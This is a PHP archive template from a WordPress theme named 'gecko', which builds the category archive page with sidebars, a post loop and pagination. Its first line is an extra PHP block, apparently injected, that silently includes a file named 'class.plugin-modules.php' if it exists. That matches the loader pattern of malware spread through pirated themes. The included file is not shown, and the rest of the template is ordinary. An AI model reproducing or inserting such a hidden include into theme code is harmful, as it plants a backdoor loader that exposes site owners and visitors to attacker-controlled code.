<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
get_header();

//  Options page settings
$full_width_layout       = get_post_meta(get_proper_ID(), 'gecko-page-full-width', true);
$builder_friendly_layout = get_post_meta(get_proper_ID(), 'gecko-page-builder-friendly', true);
$hide_sidebars           = get_post_meta(get_proper_ID(), 'gecko-page-sidebars', true);

$main_class = "";
$content_id = "";

if($settings->get_option( 'opt_archives_grid', 0 ) == 1) {
  $content_id = "content--grid";
}

if (is_active_sidebar( 'sidebar-left' ) && (!$hide_sidebars || $hide_sidebars == 'right')) {
  $main_class = "main--left";
}

if (is_active_sidebar( 'sidebar-right' ) && (($hide_sidebars == 'left' || !$hide_sidebars))) {
  $main_class = "main--right";
}

if (is_active_sidebar( 'sidebar-left' ) && is_active_sidebar( 'sidebar-right' ) && !$hide_sidebars) {
  $main_class = "main--both";
}

?>

<div id="main" class="main <?php echo $main_class; if ($full_width_layout == 1) : echo " main--full"; endif; if ($builder_friendly_layout == 1) : echo " main--builder"; endif; ?>">
  <?php get_sidebar('left'); ?>

  <div class="content">
  	<div class="page__header page__header--category">
  		<?php the_archive_title( '<h1 class="page-title">', '</h1>' ); ?>
  		<div class="page__header-desc"><?php echo category_description(); ?></div>
  	</div>

    <?php if ( have_posts() ) : ?>
      <div class="content__posts <?php if($content_id) { echo $content_id; } ?>">
      <?php
      // Start the loop.
      while ( have_posts() ) : the_post();

        /*
         * Include the Post-Format-specific template for the content.
         * If you want to override this in a child theme, then include a file
         * called content-___.php (where ___ is the Post Format name) and that will be used instead.
         */
        get_template_part( 'template-parts/content', 'archive' );

      // End the loop.
      endwhile;
      ?>
      </div>

      <?php
      // Previous/next page navigation.
      the_posts_pagination( array(
        'prev_text'          => __( 'Previous page', 'gecko' ),
        'next_text'          => __( 'Next page', 'gecko' ),
        'before_page_number' => '<span class="meta-nav screen-reader-text">' . __( 'Page', 'gecko' ) . ' </span>',
      ) );

    // If no content, include the "No posts found" template.
    else :
      get_template_part( 'template-parts/content', 'none' );

    endif;
    ?>
  </div>

  <?php get_sidebar('right'); ?>
</div>

<?php

get_footer();
